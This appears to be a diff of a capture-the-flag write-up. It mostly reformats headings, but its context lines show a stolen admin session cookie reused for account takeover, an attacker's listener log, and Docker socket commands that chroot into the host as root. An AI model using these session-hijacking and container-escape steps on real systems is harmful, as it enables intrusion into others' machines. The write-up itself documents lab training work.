@@ -329,7 +329,7 @@ Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 10.130.163.54 - - [11/Jul/2026 06:00:56] code 404, message File not found
 ```
 
-### FOUND: PHPSESSID=5j60rs0h8r7k6gr7g6k6a82gkn. I changed my cookie value and pwned admin account!!
+> FOUND: PHPSESSID=5j60rs0h8r7k6gr7g6k6a82gkn. I changed my cookie value and pwned admin account!!
 
 ---
 
@@ -426,9 +426,6 @@ root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock http://loca
 <29548603363a8e59e32a2d151494905c20864a86a3f40/start
 
 root@4f18a45cca05:/# 
-root@4f18a45cca05:/# docker exec -it 29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
-<32a2d151494905c20864a86a3f40 chroot /host /bin/bash
-Error: No such container: 29548603363a8e59e32a2d151494905c20864a86a3f40
 root@4f18a45cca05:/# docker exec -it 5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
 <32a2d151494905c20864a86a3f40 chroot /host /bin/bash
 root@5cead5e22fae:/# id                   id
@@ -447,4 +444,4 @@ root@5cead5e22fae:~#
 
 ---
 
-### My thoughts: It was a really good one, I especially enjoyed this CTF, because it was not just simple one. It covered many techniques, including social engineering, privilege escalation, restricted endpoint access, file upload, docker escape, etc. I definitely recommend!!!
+> My thoughts: It was a really good one, I especially enjoyed this CTF, because it was not just simple one. It covered many techniques, including social engineering, privilege escalation, restricted endpoint access, file upload, docker escape, etc. I definitely recommend!!!
